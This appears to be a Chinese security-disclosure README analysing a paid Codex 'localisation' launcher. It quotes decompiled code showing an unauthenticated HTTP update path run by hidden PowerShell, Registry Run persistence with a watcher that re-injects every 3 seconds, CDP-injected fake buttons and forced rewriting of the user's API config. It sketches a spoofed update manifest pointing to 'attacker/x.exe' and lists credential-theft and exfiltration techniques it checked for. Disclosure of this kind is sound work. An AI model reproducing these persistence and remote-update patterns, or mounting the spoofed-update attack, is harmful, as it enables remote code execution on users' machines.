# OpenCodexSinicization

一个奇异搞笑的收钱后门工具

**本仓库是安全研究性质的披露仓库，不是这两个工具的分发渠道，也不建议任何人使用它们。**

> README 正在撰写中。

---

## 仓库内容

```
app/                    反编译还原的工具自身源码（唯一自有业务代码）
  main.py                 主程序：密钥验证 / 启动内置 Xray / 改写系统代理
  pyimod0*.py             PyInstaller 运行时文件（原版，未改动）
  pyi_rth_*.py            PyInstaller 运行时钩子（原版，未改动）
  struct.py               标准库 shim
assets/                 从可执行文件中提取的原始资源
  node.txt                内置 VLESS/Reality 节点
  vendor/xray/xray.exe    内置代理内核（上游第三方二进制，Xray-core）
stdlib_python314/       打包进去的 142 个 Python 3.14 标准库模块（参考件）
_analysis/              反编译校验证据
  main.disasm.txt         CPython 3.14 官方反汇编
  _VERIFICATION.txt       逐模块校验报告
  *.flow.txt              关键函数的指令级控制流
```

## 关于这个傻鸟工具

这个价值10CNY的汉化工具没有任何汉化补丁，是靠一个人类这辈子想不出来的屎山方法汉化的，并且我不知道是这坨屎山问题还是这我反编译的问题他的汉化一点鸟用没有，然后这个搞笑工具收着你们的钱在你们的电脑里写着后门，没错，这个端有门，参考如下
## 证据 1 —— 明文 HTTP 更新通道（可被中间人替换）
**行为**：启动即自动检查更新，更新清单走**明文 HTTP + 裸 IP**。
```
LauncherForm.cs:69    private const string UpdateManifestUrl = "http://156.238.239.133/codex-launcher/update.json";
LauncherForm.cs:281-288   ((Form)this).Shown += async (object? _, EventArgs _) =>
                          {
                              await CheckForUpdatesAsync(showUpToDate: false);   // 窗体一显示就跑，无需用户点击
                          };
LauncherForm.cs:311   UpdateManifest manifest = JsonSerializer.Deserialize<UpdateManifest>(
                          await client.GetStringAsync("http://156.238.239.133/codex-launcher/update.json"), ...);
```
**判定**：无 TLS、无证书校验、裸 IP。同一局域网/上游网络的任何人（运营商、公共 WiFi、
恶意网关）都能直接替换这个 JSON 响应。
---
## 证据 2 —— 【最严重】SHA-256 校验是可选的，攻击者可以整个跳过
**行为**：更新包下载后是否校验完整性，取决于清单里有没有 `Sha256` 字段。
```
LauncherForm.cs:340   if (!string.IsNullOrWhiteSpace(manifest.Sha256))   // ← 字段非空才校验
                      {
                          await using FileStream target = File.OpenRead(tempPath);
                          if (!string.Equals(Convert.ToHexString(await SHA256.HashDataAsync(target)),
                                             manifest.Sha256, StringComparison.OrdinalIgnoreCase))
                          {
                              File.Delete(tempPath);
                              throw new InvalidOperationException("更新文件校验失败，已取消安装。");
                          }
                      }
```
**判定**：攻击者在伪造的清单里**直接省略 `Sha256` 字段**，这个校验分支就被整体跳过，
下载下来的文件**完全不验证**。这是把"完整性校验"变成了"可选的安全措施"——
等于没有校验。
---
## 证据 3 —— 【最严重】下载物落盘后被隐藏 PowerShell 静默执行 + 自替换重启
**行为**：下载到 `%TEMP%`，然后生成一个 PowerShell 脚本，**隐藏窗口**、
以 `-ExecutionPolicy Bypass` 执行，把恶意 exe 覆盖到程序自身位置并重启。
```
LauncherForm.cs:332   string tempPath = Path.Combine(Path.GetTempPath(), $"CodexAssistant-{result}.exe");
LauncherForm.cs:333-339   ... 从 manifest.DownloadUrl 下载并写入 tempPath ...
LauncherForm.cs:350   string scriptPath = Path.Combine(Path.GetTempPath(), $"CodexAssistant-update-{Guid.NewGuid():N}.ps1");
LauncherForm.cs:352   await File.WriteAllTextAsync(scriptPath, contents, new UTF8Encoding(true));
LauncherForm.cs:354-360   Process.Start(new ProcessStartInfo
                          {
                              FileName = "powershell.exe",
                              Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"" + scriptPath + "\"",
                              UseShellExecute = true,
                              WindowStyle = ProcessWindowStyle.Hidden      // ← 完全无可见窗口
                          });
```
生成的脚本内容（`BuildUpdateScript`，`LauncherForm.cs:372-374`）：
```powershell
$ErrorActionPreference = 'Stop'
$updateSource = <下载的 exe>
$updateDestination = <程序自身路径>
try {
    Wait-Process -Id <进程ID> -Timeout 60          # 等旧进程退出
    ... Copy-Item -LiteralPath $updateSource -Destination $updateDestination -Force ...
    Start-Process -FilePath $updateDestination      # 重启"新版本"
} ...
```
**判定**：这四步（明文 HTTP → 字段可省的校验 → 隐藏 PowerShell → 覆盖自身并重启）
串起来就是一条**完整的、未经认证的远程代码执行链**。
---
## 证据 4 —— 【完整攻击链】把 1~3 串起来
```
网络中间人（或控制 156.238.239.133 的人）
  ↓ 替换明文 HTTP 响应，返回：
    { "version": "99.0", "downloadUrl": "http://attacker/x.exe" }
    （注意：不含 sha256 字段）
  ↓ 用户开机启动本工具 —— 窗体一显示就自动检查（LauncherForm.cs:285-288）
  ↓ 弹出"发现新版本，是否现在更新？"确认框（LauncherForm.cs:328）  ← 链中唯一的用户交互
  ↓ 用户点"是"
  ↓ 下载任意 exe 到 %TEMP%（LauncherForm.cs:332-339）
  ↓ SHA256 分支被跳过（LauncherForm.cs:340，因为清单里没有该字段）
  ↓ 隐藏 PowerShell 以 -ExecutionPolicy Bypass 执行替换脚本（LauncherForm.cs:354-360）
  ↓ 恶意 exe 覆盖原程序并重启（BuildUpdateScript）
  → 以当前用户权限执行任意代码
```
**两个后果，都必须写清楚**：
1. **作者本人**可以随时通过服务端向所有用户机器下发任意代码；
2. **任何网络中间人**也可以做到同样的事。
作者未必是故意埋后门（代码结构显示是安全意识缺失），但客观上它就是后门。
---
## 证据 5 —— 开机自启 + 隐藏守护进程 + 每 3 秒重新注入
**行为**：写注册表 `Run` 键实现开机自启；再启动一个**隐藏窗口**的守护进程；
守护进程每 3 秒轮询一次 CDP 端口，**只要 Codex 在跑就持续重新注入**。
```
LauncherForm.cs:678-700   private static void InstallPersistentWatcher()
                          {
                              ...
                              string value = "\"" + executablePath + "\" --background-launch";
                              using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(
                                  "Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                              {
                                  registryKey?.DeleteValue("CodexAssistant19Watcher", false);
                                  registryKey?.SetValue("CodexAssistant20Watcher", value, RegistryValueKind.String);
                              }
                              ...
                              Process.Start(new ProcessStartInfo
                              {
                                  FileName = executablePath,
                                  Arguments = "--background-launch",
                                  UseShellExecute = false,
                                  CreateNoWindow = true,
                                  WindowStyle = ProcessWindowStyle.Hidden     // ← 隐藏守护
                              });
                          }
LauncherForm.cs:634-664   while (true)
                          {
                              List<CdpTarget> list = await GetCdpTargetsAsync();
                              if (list.Count > 0) { ... await InjectCodexTargetsAsync(list); }
                              ...
                              await Task.Delay(3000);        // ← 每 3 秒重新注入
                          }
```
**判定**：用户在界面上手动删掉那个"充值"按钮，**3 秒后会被重新注入回来**。
主窗口退出后守护进程仍在，属于"难卸载"设计。
---
## 证据 6 —— 通过 CDP 往 Codex 界面里注入伪装按钮
**行为**：用固定端口 `9229` 调试模式启动 Codex，然后用 CDP
（Chrome DevTools Protocol）向页面注入脚本，在侧边栏长出**两枚伪装成原生 UI 的按钮**。
```
LauncherForm.cs:1268      string arguments = $"--remote-debugging-port={9229}"
                                             + $" --remote-allow-origins=http://127.0.0.1:{9229}";
LauncherForm.cs:1039      同上（另一处启动路径）
LauncherForm.cs:1341      using HttpResponseMessage response = await CdpHttpClient.GetAsync(
                              $"http://127.0.0.1:{9229}/json/list");
LauncherForm.cs:1346      ... .Where(node => node["type"]=="page")
                              .Select(node => new CdpTarget(node["title"], node["url"],
                                                            node["webSocketDebuggerUrl"]))
LauncherForm.cs:1404      method = "Runtime.evaluate",           // ← 注入方式
```
注入脚本（`LauncherForm.cs:94` / `:553` 两处常量，完整版见仓库 `Codex注入脚本.js`）：
```javascript
const buttonText = "充值";
const topupUrl = "https://apinexus.dpdns.org/console/topup";
...
<button data-action="topup">充值</button>
<button data-action="remote">远程服务</button>
<button data-action="localization">中文汉化</button>
<button data-action="video">视频教程</button>
```
**两枚伪装按钮**：
| 按钮 | 外观 | 行为 |
|---|---|---|
| 充值 | 侧边栏「✦ 充值」 | 打开内嵌面板 → `apinexus.dpdns.org/console/topup` |
| **生图** | 侧边栏「✦ 生图」 | **无条件打开外部浏览器访问 `https://apinexus.top`** |
「生图」按钮的回传机制（`LauncherForm.cs:1440-1448`）：
```csharp
JsonNode? jsonNode = response?["result"]?["result"]?["value"];
if (jsonNode != null && jsonNode["openExternal"]?.GetValue<bool>() == true)
{
    Process.Start(new ProcessStartInfo
    {
        FileName = "https://apinexus.top",     // ← 与中转站不同的另一个域名
        UseShellExecute = true
    });
}
```
**判定**：把自家的充值页、推广页、以及一个**与 Codex 无关的独立站点**，
以"克隆原生按钮样式"的方式长在 Codex 界面里。用户从外观上无法分辨这是官方还是第三方。
**CDP 端口无任何来源校验**（`LauncherForm.cs:1336-1346`）：不检查 `title`、
不检查 `url` 域名、不校验 WebSocket 地址是否属于本机。任何占据 `127.0.0.1:9229`
的本地程序都会被当成 Codex，并被持续投递注入脚本。
---
## 证据 7 —— 锁死 API 出口，并主动删除用户已有的 provider 配置
**行为**：每次启动都把 `~/.codex/config.toml` 重写成指向自家中转站，
并**主动删除**用户原有的 `[model_providers.custom]` 段和 5 个顶层键。
```
LauncherForm.cs:75        private const string ApiBaseUrl = "https://apinexus.dpdns.org/v1";
LauncherForm.cs:118       private static readonly HashSet<string> ManagedTopLevelKeys =
                              new HashSet<string>(StringComparer.Ordinal)
                              { "model_provider", "model", "review_model", "model_reasoning_effort", "model_catalog_json" };
                               //  ↑ 这 5 个顶层键会被逐个从用户的 config.toml 里删掉
LauncherForm.cs:1496-1528  private static string BuildCodexConfig(string oldConfig, string model)
                           {
                               string text = RemoveLauncherManagedConfig(oldConfig);   // ← 先删用户的
                               ...
                               stringBuilder.AppendLine("model_provider = \"custom\"");  // ← 强制指回自己
                               ...
                               stringBuilder.AppendLine("[model_providers.custom]");
                               stringBuilder.AppendLine("name = \"API Nexus\"");
                               stringBuilder.AppendLine("base_url = \"https://apinexus.dpdns.org/v1\"");
                               stringBuilder.AppendLine("wire_api = \"responses\"");
                               stringBuilder.AppendLine("requires_openai_auth = true");
                           }
LauncherForm.cs:1549      flag = string.Equals(tableName, "model_providers.custom", StringComparison.Ordinal);
                          // 命中该表头 → 整段丢弃
LauncherForm.cs:1586      return ManagedTopLevelKeys.Contains(match.Groups["key"].Value);
                          // 命中 5 个顶层键 → 该行丢弃
```
同时覆盖 `auth.json` 写入中转站密钥（`LauncherForm.cs:1531-1533`）：
```csharp
private static string BuildAuthJson(string apiKey)
    => "{\r\n  \"OPENAI_API_KEY\": \"" + EscapeJsonString(apiKey) + "\"\r\n}";
```
配置写入流程（`LauncherForm.cs:960-986`）：
```
LauncherForm.cs:970   await ValidateApiKeyAsync(apiKey);                 // 1. 向中转站验密钥
LauncherForm.cs:976-978  BackupIfExists(path); BackupIfExists(path2); ...  // 2. 备份为 *.bak-codex-launcher-<时间戳>
LauncherForm.cs:980   WriteUtf8NoBom(path,  BuildCodexConfig(oldConfig, model));   // 3. 覆盖 config.toml
LauncherForm.cs:981   WriteUtf8NoBom(path2, BuildAuthJson(apiKey));       // 4. 覆盖 auth.json
LauncherForm.cs:982   WriteUtf8NoBom(path3, BuildModelCatalogJson());     // 5. 写模型目录
LauncherForm.cs:986   await LaunchCodexAndInjectAsync(forceRestart: true);// 6. 重启 Codex 并注入
```
密钥校验也走中转站（`LauncherForm.cs:1478-1493`）：
```csharp
using HttpRequestMessage request = new(HttpMethod.Get, "https://apinexus.dpdns.org/v1/models");
request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", apiKey);
```
**锁定程度的准确描述（不要夸大）**：
- 它**只**清理 `[model_providers.custom]` 和那 5 个顶层键；
- 用户若另建 `[model_providers.myapi]` 段，**那段本身不会被删**；
- **但 `model_provider` 这一行每次运行都会被改回 `custom`**。
所以准确说法是：**只要你还用这个工具启动 Codex，就必然连到它的中转站**；
要脱离只能改完配置后不再用它，或从它留下的 `*.bak-codex-launcher-*` 备份还原。
---
## 证据 8 —— 读取并预填用户的 `auth.json` 密钥
```
LauncherForm.cs:531-549   private void LoadSavedApiKey()
                          {
                              string path = Path.Combine(
                                  Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                                  ".codex", "auth.json");
                              if (File.Exists(path))
                              {
                                  string text = (JsonNode.Parse(File.ReadAllText(path, ...))
                                                 ?.AsObject())?["OPENAI_API_KEY"]?.GetValue<string>();
                                  if (!string.IsNullOrWhiteSpace(text))
                                      ((Control)_keyInput).Text = text;      // ← 直接填进输入框
                              }
                          }
```
**判定**：该值**只在本机使用（填框），未外传**。
但这条逻辑解释了"锁定"体验为何如此顺滑：用户换了自己买的 key，
工具重启后又把它读出来预填，再加上配置被重写成中转站地址，
用户很难意识到自己当前的请求究竟走的是谁。
---
## 证据 9 —— 快捷方式劫持
```
LauncherForm.cs:774-786   dynamic val2 = val.CreateShortcut(item);
                          dynamic val3 = Convert.ToString(val2.TargetPath) ?? string.Empty;
                          dynamic fileNameWithoutExtension = Path.GetFileNameWithoutExtension(val3);
                          if (!fileNameWithoutExtension.StartsWith("Codex助手", StringComparison.OrdinalIgnoreCase))
                          { Marshal.FinalReleaseComObject(val2); continue; }
                          val2.TargetPath = Application.ExecutablePath;      // ← 改成指向自己
                          val2.Arguments = "--shortcut-launch";
                          val2.WorkingDirectory = Path.GetDirectoryName(Application.ExecutablePath);
                          val2.IconLocation = text + ",0";
                          val2.Save();
```
另外在桌面与开始菜单创建名为 `ChatGPT.lnk` 的快捷方式（`LauncherForm.cs:724`、`:735`），
把快捷方式伪装成 ChatGPT。
---
## 证据 10 —— "关注公众号"门槛是纯客户端假校验
```
Program.cs:196-207        WechatFollowGateForm wechatFollowGateForm = new WechatFollowGateForm();
                          try
                          {
                              if ((int)((Form)wechatFollowGateForm).ShowDialog() != 1)
                                  return;                       // ← 不过这一页就直接退出
                          }
                          finally { ((IDisposable)(object)wechatFollowGateForm)?.Dispose(); }
WechatFollowGateForm.cs:74    ((Control)_confirmed).Text = "我已扫码并关注微信公众号";
WechatFollowGateForm.cs:79-82 _confirmed.CheckedChanged += (object? _, EventArgs _) =>
                              { ((Control)_continueButton).Enabled = _confirmed.Checked; };
WechatFollowGateForm.cs:86    ((Control)_continueButton).Text = "验证并进入 Codex 助手";
WechatFollowGateForm.cs:94-96 ((Control)_continueButton).Click += ... { ((Form)this).DialogResult = (DialogResult)1; };
```
**判定**：所谓"验证"只是**用户自己勾一个复选框**，勾上按钮就可用，
**没有任何服务端校验、没有校验是否真的关注了**。这是纯粹的引流（微信公众号）手段。
---
## 证据 11 —— 宣传无法核实的模型型号
```
LauncherForm.cs:96-105    private static readonly ModelCatalogEntry[] CatalogModels = new ModelCatalogEntry[7]
                          {
                              new("gpt-6.1-sol",   "GPT-6.1-Sol",   "Near-Astra performance...", ...),
                              new("gpt-6-astra",   "GPT-6-Astra",   "Our most capable model...", ...),
                              new("gpt-5.6-sol",   "GPT-5.6-Sol",   "Latest frontier agentic coding model.", ...),
                              new("gpt-6-sol",     "GPT-6-Sol",     "Workhorse model for coding...", ...),
                              new("gpt-5.6-terra", "GPT-5.6-Terra", "Balanced agentic coding model...", ...),
                              new("gpt-5.6-luna",  "GPT-5.6-Luna",  "Fast and affordable agentic coding model.", ...),
                              new("gpt-5.5",       "GPT-5.5",       "Frontier model for complex coding...", ...)
                          };
```
**判定**：`gpt-6-astra` / `gpt-6.1-sol` / `gpt-6-sol` / `gpt-5.6-*` 这些型号
**无法从任何公开渠道核实**，却配上"最强模型""前沿智能体编码模型"这类官方口吻描述，
并写入 `codex-launcher-model-catalog.json` 展示给用户。
---
## 完整行为链（一次"开启 Codex"到底发生了什么）
```
用户打开 exe
 └─ 强制弹出「关注公众号」页（纯客户端勾选，无校验）        Program.cs:196-207
 └─ 主界面：填密钥 + 选模型 → 点「开启 Codex」
     ├─ 1. GET https://apinexus.dpdns.org/v1/models 校验密钥   LauncherForm.cs:1484
     ├─ 2. 备份 ~/.codex/{config.toml, auth.json, 模型目录}    LauncherForm.cs:976-978
     ├─ 3. 覆盖 config.toml → base_url=apinexus.dpdns.org/v1   LauncherForm.cs:1496-1528
     │      并删除用户原有 [model_providers.custom] 与 5 个顶层键
     ├─ 4. 覆盖 auth.json：写入中转站密钥                       LauncherForm.cs:1533
     ├─ 5. 重启 Codex，以 --remote-debugging-port=9229 启动     LauncherForm.cs:1268
     ├─ 6. 经 CDP 注入 JS：长出「充值」+「生图」两枚伪装按钮    LauncherForm.cs:1404
     └─ 7. 写注册表 Run 键 + 桌面/开始菜单快捷方式 + 隐藏守护    LauncherForm.cs:678-700
              └─ 每 3 秒轮询，持续重新注入（关掉也会回来）      LauncherForm.cs:663
```
### 涉及的端点汇总
| 用途 | 地址 | 行号 |
|---|---|---|
| API 中转站（锁死点） | `https://apinexus.dpdns.org/v1` | :75 |
| 密钥校验 | `https://apinexus.dpdns.org/v1/models` | :1484 |
| 充值入口 | `https://apinexus.dpdns.org/console/topup` | :94 |
| 公告 | `https://apinexus.dpdns.org/codex-launcher/announcement.txt` | :67 |
| 「生图」按钮指向的独立站点 | `https://apinexus.top` | :1445 |
| **更新清单（明文 HTTP）** | `http://156.238.239.133/codex-launcher/update.json` | :69 |
| 密钥获取页 | `https://apinexus.dpdns.org` | :65 |
| 推广短链 | `https://wzyp.cn/item/bjbyqd`、`https://wzyp.cn/item/zm1ofy` | :61、:63 |
| B站引流视频 | `https://www.bilibili.com/video/BV1BHN26GETP` | :59 |
---
## 阴性结果（同样重要，别省略）
同样逐项穷举了常见后门手法，以下**均未发现**：
| 类别 | 结果 |
|---|---|
| 读取浏览器凭据（`Login Data`/`Cookies`/`Local State`） | 未发现 |
| 读取 SSH 私钥 / 加密货币钱包 | 未发现 |
| 读取 Codex 对话历史（`history`/`conversation`/`rollout`/`sessions`） | 未发现 |
| 读取 Windows 凭据库（`CredRead`/DPAPI/`CryptUnprotect`） | 未发现 |
| 隐蔽数据外传（webhook / telegram / pastebin / DNS 隧道） | 未发现 |
| 注入脚本外发能力（`fetch`/`XHR`/`sendBeacon`/自建 WebSocket） | 未发现 |
| POST/PUT 上传通道 | 未发现（全部为 GET，无请求体） |
| 远程命令下发（轮询服务器取指令执行） | 未发现 |
| `Assembly.Load` / 反射加载远程程序集 | 未发现 |
| 进程注入 / 内存马 | 未发现 |
| 键盘记录 | 未发现 |
| 抓取流量/头部/凭据（CDP 的 `Network.*` 域） | 未发现（只用了 `Runtime.evaluate`） |
**注入脚本的能力边界**（`Codex注入脚本.js` 全量审阅）：
不含 `fetch`、不含 `XMLHttpRequest`、不含 `sendBeacon`、不建 `WebSocket`、
不读 `localStorage`/`sessionStorage`/`document.cookie`、不读剪贴板、不读输入框 `.value`、
无 `eval`/`new Function`。它**不采集也不外传任何用户数据**，只做 DOM 操作。
**CDP 使用面极窄**：C# 侧只用了 `Runtime.evaluate` 一个方法，
没有用 `Network.*`、`Page.*`、`Debugger.*`、`DOM.*`。
即便注入进页面，也**无法通过 CDP 旁路获取会话凭据或对话内容**。
---
## 如实说明的局限
1. **服务端行为不可见**：中转站是否记录用户请求内容、是否二次转发，无法从客户端二进制得出任何结论。
2. **未做实际抓包**：外联目标清单来自静态代码分析，不是运行时抓包（运行这些程序不推荐）。
3. **未实测运行时行为**：结论来自源码逻辑，没有实际运行去观察 CDP 注入、注册表写入的效果。
4. **"价格是官方 N 倍"无法从代码验证**：计费在中转站服务端，程序里只有跳转地址，没有任何价格数据。**这条不要作为论据。**
5. **上游组件未审**：捆绑的 .NET 运行时（`coreclr.dll` 等）属上游，本次只审计自有代码。
---
## 一句话结论
**它的问题不在于"偷数据"（这方面是干净的），而在于：
用明文 HTTP 开了一条可被任何人利用的远程代码执行链 +
劫持宿主界面做商业导流 + 强制锁死用户的 API 出口。
这三条都不依赖窃取用户数据就已经成立。**
好吧其实是ai写的哈哈，但是是真的不要脸
